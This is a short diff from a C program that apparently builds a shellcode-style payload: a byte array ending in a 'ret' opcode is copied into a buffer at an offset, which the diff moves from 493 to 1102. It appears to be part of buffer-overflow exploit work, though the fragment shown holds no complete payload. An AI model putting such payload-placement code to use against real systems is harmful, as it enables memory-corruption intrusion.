@@ -18,7 +18,7 @@ int main() {
                      "\xc3"; // ret
 
     for (int i = 0; i < 24; i++) {
-        buffer[493 + i] = syscall[i];
+        buffer[1102 + i] = syscall[i];
     }
 
     // string
